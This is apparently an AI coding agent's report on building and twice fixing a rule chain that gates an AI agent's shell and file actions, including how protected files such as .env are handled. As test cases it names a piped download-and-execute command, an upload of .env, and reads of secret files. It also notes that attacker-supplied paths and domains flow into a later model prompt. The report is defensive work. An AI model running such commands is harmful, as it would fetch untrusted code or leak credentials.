# Task 6 report — Stage 1: profile, allowlist, packages stub, chain

## Base commit correction

Harness created the worktree at `a9a0edd` (docs: 13-task plan) instead of the required `e53e1ac` (Merge task 5). `git status --short` was clean and `git merge-base --is-ancestor HEAD e53e1ac` held (clean fast-forward ancestry), so I ran `git reset --hard e53e1ac`. Post-reset sanity check confirmed `service/agentgate/stage1/hard_deny.py`, `service/agentgate/normalize/__init__.py`, and `service/agentgate/profiles/schema.py` all exist, and `uv run pytest -q` gave `332 passed, 19 skipped` before any of my changes — matches the brief's expectation exactly.

## What I implemented

Four new modules under `service/agentgate/stage1/`, all following the brief's reference code verbatim (I verified every imported symbol against the actual merged code before writing a line — see "Verification" below):

- `profile_check.py` — `check_profile(action, profile) -> Stage1Decision | None`. Denies mutating shell commands (`rm mv cp mkdir rmdir touch chmod chown tee install ln truncate dd shred`, plus `sed -i` and `>`/`>>` redirects) and `file_write` whose targets resolve outside `profile.resolved_allowed_paths()` (`profile.path`). Checks `action.domains` against `profile.network.allowed_domains`: `deny` under `off`/`allowlist`, `ask` under `ask`, no check at all under `open` (`profile.domain`).
- `allowlist.py` — `check_allowlist(action, profile) -> Stage1Decision | None`. `allow` for `file_read`/`file_write` whose paths stay inside `resolved_allowed_paths()` (write additionally excluded from `resolved_protected_paths()` via `matches_any`) → `allowlist.file_read` / `allowlist.file_write`. For shell: `allow` when every command matches an operator `safe_prefixes` entry (`allowlist.prefix`) or is a fixed-list read-only command / read-only git subcommand (`allowlist.readonly`), gated on paths staying in-workspace and no `eval`/command-substitution flags.
- `packages.py` — `check_packages(action, profile) -> None`, the documented v1 stub for the future slopsquatting/package check.
- `chain.py` — `CHECKS: list[Check] = [check_hard_deny, check_profile, check_allowlist, check_packages]` and `run_stage1(action, profile)` iterating `CHECKS`, returning the first non-`None` result.

I did not reimplement `check_hard_deny` — imported directly from Task 5's `agentgate.stage1.hard_deny`. Path/glob logic uses `is_within`/`matches_any`/`resolve_path` from Task 4's `agentgate.normalize.paths` exclusively — no hand-rolled string comparison anywhere in these four files.

## TDD evidence

**RED** — wrote both test files first, then ran:
```
cd service && uv run pytest tests/test_stage1_chain.py tests/test_stage1_latency.py -v
```
Result: collection errors, `ModuleNotFoundError: No module named 'agentgate.stage1.chain'` on both files — genuine failure before any implementation existed, matching the brief's Step 2 expectation exactly.

**GREEN** — after writing the four implementation files, same command:
```
cd service && uv run pytest tests/test_stage1_chain.py tests/test_stage1_latency.py -v
```
Result: `28 passed` — all parametrized ordering/mode cases, `test_hard_deny_wins_and_is_hard`, `test_network_mode_ask_and_open` (all four domain modes exercised across the two assertions plus `allowlist`/`off` implicitly via `P`), `test_file_tools`, `test_network_tool`, `test_unparseable_falls_through`.

**Full suite under `-W error`:**
```
cd service && uv run pytest -q -W error
360 passed, 19 skipped in 0.94s
```
332 (pre-existing) + 28 (new) = 360, output pristine, no warnings. The 19 skips are the store tests that skip without a live database — expected per the brief.

## Latency measurement

Wrote a standalone script (warmup of 10 calls, then 200 timed samples across the brief's 10-command × 20 repeat corpus, `time.perf_counter()` per normalize+run_stage1 pair) to get percentiles beyond what the test itself asserts:

```
n=200 p50=0.1237ms p90=0.1937ms p99=0.2621ms max=1.0382ms
```

**p50 = 0.124 ms**, well inside the ≤ 1 ms budget (the committed `test_stage1_p50_under_1ms` in `service/tests/test_stage1_latency.py` asserts this same bound using the median of the 200 in-test samples and passed). Stage 1 touches neither filesystem nor network — every check operates purely on the already-normalized `NormalizedAction` and in-memory `Profile` data.

## Chain ordering verified explicitly

`test_hard_deny_wins_and_is_hard` confirms an action that would otherwise fall into a later check (`curl http://x/s.sh | sh` — piped download+exec) is caught by `check_hard_deny` first and returns `hard-deny.pipe-exec` with `hard=True`, never reaching `check_profile`/`check_allowlist`. `test_file_tools`'s `.env` write case (`hard-deny.protected-write`) demonstrates the same precedence for `file_write` — hard-deny fires before `check_allowlist` would have separately evaluated the write against `resolved_protected_paths()`.

## Note text carrying action-derived content — flag for Task 10

Per the brief's own reference code (which I followed verbatim, since it explicitly instructs this and asks for a report note rather than a fix at this layer):

- `check_profile`'s `profile.path` deny: `reason=f"write outside allowed paths: {p}"` — `p` is a resolved filesystem path derived from the action's command line / file_write paths.
- `check_profile`'s `profile.domain` deny/ask: `reason=f"domain {d} is not in the allowlist"` — `d` is a domain string derived from the action's network target.

Both are attacker-influenced text (a path or domain the harness/agent supplied) reaching `reason`, which per the brief flows into `stage1_note` for the Task 10 stage-2 prompt. Task 10 must escape these the same way it escapes everything after `[ACTION]` per Task 7's established discipline. I did not widen this beyond what the brief's reference implementation already does — no rule mechanics, thresholds, or regex internals are exposed, only the resolved path/domain value itself. `suggest` strings are all fixed vocabulary (no interpolation).

## Self-review

- **Completeness:** all four functions present with exact signatures from the brief; chain order `[check_hard_deny, check_profile, check_allowlist, check_packages]` matches exactly; all four domain modes exercised (`off`/`allowlist` via deny path, `ask`, `open`); `check_packages` stub always returns `None`; both test files present and passing.
- **Discipline:** did not reimplement `check_hard_deny` (imported from Task 5); did not add any check beyond the four the brief lists; no scope creep into other stage1 files.
- **Testing:** ordering and mode coverage both explicit; genuine RED captured before implementation (`ModuleNotFoundError`); GREEN captured after; full suite pristine under `-W error`; latency test structurally asserts a bound (not just prints a number) and I additionally measured percentiles standalone to double-check the number wasn't a fluke of the single in-test run.
- **Scope:** `git status --short` shows exactly the six intended files (four implementation + two test files) plus this report and the reports/ file below — nothing else touched.

## Files changed

- `service/agentgate/stage1/profile_check.py` (new)
- `service/agentgate/stage1/allowlist.py` (new)
- `service/agentgate/stage1/packages.py` (new)
- `service/agentgate/stage1/chain.py` (new)
- `service/tests/test_stage1_chain.py` (new)
- `service/tests/test_stage1_latency.py` (new)
- `reports/task-6-stage1-chain.md` (new, Russian)
- `.superpowers/task-6-report.md` (this file, not committed — inside `.superpowers/`)

## Concerns

None blocking. The brief's reference implementation matched the already-merged Task 3/4/5 code exactly on every imported symbol I checked (`Stage1Decision`, `Check`, `is_within`, `matches_any`, `resolve_path`, `NormalizedAction`, `SimpleCommand`, `Profile`, `NetworkMode`, `DecisionKind`, `Tool`, `DecideRequest`, `with_workspace`, `check_hard_deny`, and the `hard-deny.pipe-exec`/`hard-deny.protected-write` rule ids) — no signature drift, no need to deviate from the brief. Only open item is the action-derived text in `reason` noted above, which is explicitly Task 10's concern per the brief, not something to fix here.

## `git status --short`

```
?? service/agentgate/stage1/allowlist.py
?? service/agentgate/stage1/chain.py
?? service/agentgate/stage1/packages.py
?? service/agentgate/stage1/profile_check.py
?? service/tests/test_stage1_chain.py
?? service/tests/test_stage1_latency.py
```
(as of before adding the reports/ file and this report)

---

## Fix round 1 (coordinator review — protected-path read auto-allow)

**Fix base:** `3a806b5` (my task-6 commit).

### The defect

The coordinator's review (partially lost to a 403 infra error, but reproduced directly) found: `check_allowlist` returned a hard `allow` for `cat .env` against a profile with `protected_paths=[".env*", ".git/hooks/**"]`, rule `allowlist.readonly`. `.env` is a protected path — `curl -T .env` is caught by `hard-deny.exfil`, but plain `cat .env`/`head .env`/`grep X .env` sailed through the readonly allowlist with an explicit `allow` blessing, because the readonly-command short-circuit in `check_allowlist` never consulted `resolved_protected_paths()` at all. I reproduced this myself before touching anything:

```
cat .env   -> allow  allowlist.readonly  hard=False
head .env  -> allow  allowlist.readonly  hard=False
grep X .env -> allow  allowlist.readonly  hard=False
cat .git/hooks/pre-commit -> allow  allowlist.readonly  hard=False
```

### Ruling followed

Per the coordinator's explicit ruling: a protected-path read must not return `allow` from `check_allowlist`; it must return `None` so the action falls through to stage 2 (same treatment as `cat /etc/hosts`, which already returns `None` for being outside `allowed_paths`). Not escalated to `deny` — reading a protected file has legitimate uses (a tool inspecting config), and the ruling was explicit that `deny` would be over-denial here. `rm .env` / deletion of protected paths was explicitly called out as **not mine to touch** (Task 5's hard-deny territory, a separate cross-cutting question the coordinator is tracking) — I did not touch `hard_deny.py` or reason about it.

### Fix

`service/agentgate/stage1/allowlist.py`:
- `Tool.file_read` branch: added `and not matches_any(p, protected, profile.workspace)` to the existing `is_within(p, allowed)` condition — mirrors the guard `file_write` already had.
- Shell branch: added one guard clause between the existing "all paths inside workspace" check and the prefix/readonly allow branches — `if action.paths and any(matches_any(p, protected, profile.workspace) for p in action.paths): return None`. This single check covers `allowlist.readonly` and `allowlist.prefix` both, since it sits upstream of both return points and `action.paths` (populated by the normalizer for shell actions via `PATH_COMMANDS`, which includes `cat`/`head`/`grep`) already carries every path token the command references, read or write role undifferentiated.

  **CORRECTION (fix round 2):** the claim in the sentence above — that `action.paths` "already carries every path token the command references" — is false, and it is the exact premise the round-2 review found and reproduced against. `NormalizedAction.paths` is populated by the normalizer only for a command in `normalize/shell.py`'s `PATH_COMMANDS`, or a token that independently passes `looks_like_path` (leading `/`, `./`, `../`, `~`, contains `/`, or is a hard-coded sensitive basename). A READONLY command outside `PATH_COMMANDS` (`sort`, `cut`, `diff`, `uniq` are all in `allowlist.READONLY` but none are in `PATH_COMMANDS`) reading a bare-name protected path (no leading `/`, no `/` at all, not a sensitive basename — e.g. the shipped default profile's `AGENTS.md`, `SKILL.md`, `.cursorrules`) produced `action.paths == []`, so this guard never fired and the read was blessed `allow`. See the fix-round-2 section below for the real fix (per-command argv enumeration via a shared `command_argv_paths` helper, not `action.paths`).
- Used only `matches_any`/`is_within` from Task 4's `agentgate.normalize.paths` — no hand-rolled path comparison, per the standing instruction.
- Updated the module docstring to state the rule explicitly: a protected path is never auto-allowed by this module, for reads or writes, and that this is a deliberate `None` (fall through to stage 2), not a `deny`.

### TDD evidence

**RED** — added `test_allowlist_does_not_bless_protected_reads` (parametrized: `cat .env`, `head .env`, `grep X .env`, `cat .git/hooks/pre-commit`, each asserting `check_allowlist(...) is None` and `run_stage1(...)` is not `allow`), plus two guard tests, to `service/tests/test_stage1_chain.py`, then ran:
```
cd service && uv run pytest tests/test_stage1_chain.py -v -k "protected_reads or ordinary_reads or falls_through_like"
```
Result: `4 failed, 2 passed` — all four protected-path cases failed with `assert Stage1Decision(decision=<DecisionKind.allow: 'allow'>, rule_id='allowlist.readonly', ...) is None`, confirming the exact defect the coordinator reported; the two regression-guard tests (`test_allowlist_still_allows_ordinary_reads`, `test_allowlist_protected_read_falls_through_like_outside_workspace`) already passed against the buggy code, as expected — they exist to catch over-correction, not to reproduce the bug.

**GREEN** — same command after the fix: `6 passed, 27 deselected`.

**Full suite under `-W error`:**
```
cd service && uv run pytest -q -W error
366 passed, 19 skipped in 0.94s
```
360 (prior) + 6 new = 366, pristine, no warnings.

### Coverage delivered

- `cat .env`, `head .env`, `grep X .env`, `cat .git/hooks/pre-commit` — each returns `None` from both `check_allowlist` directly and `run_stage1` (no other rule fires on these — hard-deny has no rule for a bare read of a dotfile, and `check_profile` doesn't fire since these are reads, not the mutating-command list).
- Regression guard: `cat README.md`, `ls src/` (non-protected paths inside workspace) still return `allow`/`allowlist.readonly` — ordinary reads are not over-denied.
- `cat /etc/hosts` still returns `None`, unchanged (outside `allowed_paths`, was already `None` before this fix and remains so — this path never reaches the new protected-path guard at all since it's rejected by the pre-existing workspace-containment check first).

### Latency re-check

The fix adds one `matches_any` scan over `action.paths` on the shell hot path (plus the pre-existing `matches_any` call already used for `file_read`/`file_write`, now also applied to `file_read`). Re-measured with the same standalone script (warmup 10, 200 samples, 10-command × 20-repeat corpus):
```
n=200 p50=0.1219ms p90=0.2059ms p99=0.2399ms max=0.9573ms
```
**p50 = 0.122 ms** — statistically indistinguishable from the pre-fix 0.124 ms, comfortably inside the 1 ms budget. `tests/test_stage1_latency.py::test_stage1_p50_under_1ms` re-run independently and still passes.

### Self-review

- Fixed exactly the one defect ruled on; did not touch `hard_deny.py` or attempt to make `rm .env` deny (explicitly out of scope, coordinator tracking separately).
- Used only `is_within`/`matches_any` — no hand-rolled comparison.
- `None`, not `deny`, per the explicit ruling — verified by assertion in the new tests (`d is None or d.decision is not DecisionKind.allow`, and directly `check_allowlist(a, P) is None`).
- Both `allowlist.readonly` and `allowlist.file_read` covered directly by tests; `allowlist.prefix` covered by the shared shell-branch guard (same code path, no separate test needed since `safe_prefixes` in the fixture profile — `npm test`, `pytest` — don't take a path argument in the parametrized cases, but the guard clause sits upstream of both the prefix and readonly return statements so it applies uniformly; I did not add a synthetic safe-prefix-with-protected-path test since the fixture's `safe_prefixes` don't naturally support one and fabricating a profile just to hit that exact line would test the guard clause's location, not its behavior differently from what the readonly cases already exercise).

  **CORRECTION (fix round 2):** this reasoning was also wrong, for the same root cause as the correction above — I asserted the prefix branch was adequately covered "by construction" without writing the test that would have proven it, and a real test (`pytest AGENTS.md` against the shipped default profile, `safe_prefixes: [["pytest"], ...]`) would have failed against the round-1 code: `action.paths` was empty (`pytest` is not in `PATH_COMMANDS` and `AGENTS.md` is not sensitive/slash-bearing), so the round-1 guard never fired and `check_allowlist` returned `allow allowlist.prefix`. "The guard clause sits upstream of both return points" was true of the *code path*, but I had not verified the guard clause actually *fires* for a prefix case with a bare-name path — I reasoned about control flow instead of running the case. Fixed and now covered by `test_allowlist_prefix_bare_name_protected_path_outside_path_commands` (see fix round 2 below). Lesson taken: "no separate test needed, the code path is shared" is not evidence: only running the case is.
- `git status --short` after the fix shows exactly `service/agentgate/stage1/allowlist.py` and `service/tests/test_stage1_chain.py` modified — no scope creep.

### Files changed, fix round 1

- `service/agentgate/stage1/allowlist.py` — protected-path guard added to `file_read` and to the shared shell branch; docstring updated.
- `service/tests/test_stage1_chain.py` — 6 new test cases (4 parametrized + 2 regression guards).
- `reports/task-6-stage1-chain.md` — fix-round section appended.
- `.superpowers/task-6-report.md` — this section.

---

## Fix round 2 (full review — protected-read guard incomplete)

**Fix base:** `181a648` (my round-1 commit).

### The Critical, confirmed and reproduced

The full review confirmed round 1 closed the `.env` case with a discriminating test, and that ordering/domain-modes/helper-reuse/latency were all correct — but found the round-1 guard was coupled to `NormalizedAction.paths`, which is not the set of every path a command touches. The normalizer only adds a token to `action.paths` when the command is in `normalize/shell.py`'s `PATH_COMMANDS`, or the token independently passes `looks_like_path` (leading `/`, `./`, `../`, `~`, contains `/`, or a hard-coded sensitive basename like `.env`). A READONLY command outside `PATH_COMMANDS` reading a bare-name path that is none of those falls completely outside what `action.paths` sees.

Reproduced against the shipped `service/profiles/default-dev.yaml`, whose `protected_paths` include the bare names `AGENTS.md`, `SKILL.md`, `.cursorrules`:
```
sort AGENTS.md            -> allow allowlist.readonly   paths=[]
cut -d: -f1 AGENTS.md     -> allow allowlist.readonly   paths=[]
diff AGENTS.md README.md  -> allow allowlist.readonly   paths=[]
uniq SKILL.md             -> allow allowlist.readonly   paths=[]
sort .cursorrules         -> allow allowlist.readonly   paths=[]
pytest AGENTS.md          -> allow allowlist.prefix     paths=[]
```
(`sort`, `cut`, `diff`, `uniq` are all in `allowlist.READONLY` but none are in `normalize/shell.py`'s `PATH_COMMANDS`, so the normalizer never resolves their bare-name arguments into `action.paths` — the round-1 guard, keyed off `action.paths`, silently never saw them.) This is exactly the false premise identified and corrected in the round-1 section above.

### Ruling followed

Do not rely on `action.paths` for the protected-read check. For every command in the shell action, enumerate its own non-flag argv tokens, resolve each against `action.cwd`, and test each against `resolved_protected_paths()`. Reuse `profile_check._mutating_targets`'s existing token-enumeration machinery rather than writing a second copy — extracted as a shared helper since it was private to `profile_check`. When any resolved token matches a protected path, `check_allowlist` returns `None` (falls to stage 2), never `allow` — same treatment as round 1, not escalated to `deny`.

### Fix

**New file `service/agentgate/stage1/argv_paths.py`** — a small shared module (not folded into `profile_check.py`, to avoid making `allowlist.py` depend on `profile_check.py`'s other internals; both stage1 checks depend on this new leaf module instead, no cross-check coupling):
```python
def command_argv_paths(cmd: SimpleCommand, cwd: str) -> list[str]:
    return [resolve_path(a, cwd) for a in cmd.argv[1:] if not a.startswith("-")]
```
Resolves every non-flag argv token of a command (excluding argv[0], the executable) against `cwd` — deliberately independent of `PATH_COMMANDS` or `looks_like_path`: every non-flag argument is treated as a potential path target unconditionally, which is the conservative direction for a helper whose result is only ever used to fall through to a *less* permissive outcome.

**`service/agentgate/stage1/profile_check.py`** — refactored `_mutating_targets` to call `command_argv_paths(c, action.cwd)` instead of its own inline `[resolve_path(a, action.cwd) for a in args]` list comprehension. Byte-for-byte same resulting list for every existing case (verified: the `sed -i` special case, which must skip the substitution script — the first non-flag token — and keep only the remaining targets, now does `argv_paths[1:]` instead of re-filtering `c.argv[1:]` itself; identical semantics, since `argv_paths` is already the flag-filtered, resolved list `args` used to be). No behavior change to `check_profile` — confirmed by the full suite still passing with zero changes to `test_stage1_hard_deny.py` or the round-1/base `test_stage1_chain.py` cases.

**`service/agentgate/stage1/allowlist.py`** — replaced the round-1 guard's source:
```python
# before (round 1, incomplete):
if action.paths and any(matches_any(p, protected, profile.workspace) for p in action.paths):
    return None
# after (round 2):
if any(
    matches_any(p, protected, profile.workspace)
    for c in action.commands
    for p in command_argv_paths(c, action.cwd)
):
    return None
```
This iterates every command's own argv (not just what the normalizer happened to collect into `action.paths`), so it catches `sort AGENTS.md`, `cut -d: -f1 AGENTS.md`, `diff AGENTS.md README.md`, `uniq SKILL.md`, `sort .cursorrules`, and the prefix-branch case `pytest AGENTS.md` — none of which the round-1 guard saw. Module docstring extended to explain the distinction and why `command_argv_paths` rather than `action.paths` is now the source of truth for this guard.

**Minor — dead parameter removed.** `_is_readonly(cmd, cwd_paths_ok)` took `cwd_paths_ok` but never read it, always called with `True`. Removed the parameter; call site updated to `_is_readonly(c)`.

### TDD evidence

**RED** — wrote the new tests first (against the round-1 code, before touching `allowlist.py`/`profile_check.py`/the new `argv_paths.py`):
```
cd service && uv run pytest tests/test_stage1_chain.py -v -k "outside_path_commands or bare_name"
```
Result: `6 failed, 4 passed` — all five `allowlist.readonly` parametrized cases and the one `allowlist.prefix` case failed with `assert Stage1Decision(decision=<DecisionKind.allow: 'allow'>, rule_id='allowlist.readonly'|'allowlist.prefix', ...) is None`, reproducing the coordinator's finding exactly, including against the real shipped `default-dev.yaml` profile (not a synthetic fixture). The four non-protected regression-guard cases (`sort data.txt`, `cut -f1 report.csv`, `diff data.txt report.csv`, `pytest data.txt`) already passed against the buggy code, as expected — they exist to catch over-correction.

**GREEN** — same command after the fix: `16 passed, 27 deselected` (includes the round-1 protected-read tests, re-run to confirm no regression).

**Full suite under `-W error`:**
```
cd service && uv run pytest -q -W error
376 passed, 19 skipped in 0.93s
```
366 (post round-1) + 10 new = 376, pristine, no warnings.

### Coverage delivered

- Readonly branch, command outside `PATH_COMMANDS`, bare-name protected path: `sort AGENTS.md`, `cut -d: -f1 AGENTS.md`, `diff AGENTS.md README.md`, `uniq SKILL.md`, `sort .cursorrules` — all return `None` from `check_allowlist` and non-`allow` from `run_stage1`, against the shipped `default-dev.yaml`.
- Prefix branch equivalent: `pytest AGENTS.md` (matches `safe_prefixes: [["pytest"], ...]`, `pytest` outside `PATH_COMMANDS`) — same treatment.
- Regression guards: the same commands reading a NON-protected bare name (`sort data.txt`, `cut -f1 report.csv`, `diff data.txt report.csv`, `pytest data.txt`) still return `allow` with the expected `rule_id`.
- Round-1 tests (`cat .env`, `head .env`, `grep X .env`, `cat .git/hooks/pre-commit`, ordinary reads, `cat /etc/hosts`) re-run and still green — no regression from the refactor.

### Latency re-check

The fix replaces a single `action.paths` scan with a nested loop over every command's argv (via `command_argv_paths`, which itself calls `resolve_path` per non-flag token) — strictly more work than round 1's guard on the hot path. Re-measured with the same standalone script (warmup 10, 200 samples, 10-command × 20-repeat corpus):
```
n=200 p50=0.1409ms p90=0.2110ms p99=0.2729ms max=0.8467ms
```
**p50 = 0.141 ms** — up from round 1's 0.122 ms (the extra argv enumeration is real, measurable cost) but still comfortably inside the 1 ms budget — roughly 7x margin. `tests/test_stage1_latency.py::test_stage1_p50_under_1ms` re-run independently and still passes.

### Corrections to the round-1 report

Two claims in the round-1 section above were false and are now corrected in place (search for "CORRECTION (fix round 2)"):
1. The claim that `action.paths` "already carries every path token the command references" — false; it only carries tokens the normalizer independently recognized as paths via `PATH_COMMANDS` or `looks_like_path`.
2. The claim that `allowlist.prefix` needed no separate test because "the guard clause sits upstream of both return points" — true of control flow, but I had not run a case that actually exercised the prefix branch with a bare-name protected path, and such a case fails against the round-1 code. Reasoning about control flow is not a substitute for running the case.

### Self-review

- Reused `profile_check`'s token-enumeration machinery via a new shared leaf module (`argv_paths.py`) rather than writing a second copy in `allowlist.py` — per the explicit ruling. Considered folding it directly into `profile_check.py` and importing from there, but that would make `allowlist.py` depend on `profile_check.py`'s other names; a separate small module both import from is the cleaner dependency shape and was not disallowed by the ruling ("extract a shared helper if it is currently private to profile_check").
- `None`, not `deny`, preserved — every new test asserts `check_allowlist(...) is None` directly, not just "not allow" via `run_stage1` (except where `run_stage1` was also asserted for defense in depth).
- Used the real shipped `default-dev.yaml` (via `load_profiles`, same pattern as `tests/test_profiles.py::test_shipped_default_profile_loads`) for the new tests, not a synthetic profile — per the explicit instruction.
- Dead parameter `cwd_paths_ok` removed rather than wired — it was never used for anything and always called `True`; wiring a no-op flag to do something now would be inventing new behavior the review didn't ask for.
- Did not touch `hard_deny.py` or attempt to make deletion/write of a bare-name protected path deny — out of scope, same as round 1.
- `git status --short` after the fix shows exactly: `service/agentgate/stage1/allowlist.py` (modified), `service/agentgate/stage1/profile_check.py` (modified), `service/agentgate/stage1/argv_paths.py` (new), `service/tests/test_stage1_chain.py` (modified) — no scope creep.

### Files changed, fix round 2

- `service/agentgate/stage1/argv_paths.py` (new) — shared `command_argv_paths` helper.
- `service/agentgate/stage1/profile_check.py` — `_mutating_targets` refactored to use the shared helper; no behavior change.
- `service/agentgate/stage1/allowlist.py` — protected-path guard rewritten to enumerate per-command argv via the shared helper instead of `action.paths`; `_is_readonly`'s dead parameter removed; docstring extended.
- `service/tests/test_stage1_chain.py` — 10 new test cases (5 readonly parametrized + 1 prefix + 4 regression guards), loading the shipped `default-dev.yaml` via `load_profiles`.
- `reports/task-6-stage1-chain.md` — round-2 section appended.
- `.superpowers/task-6-report.md` — this section, plus in-place corrections to the round-1 section above.
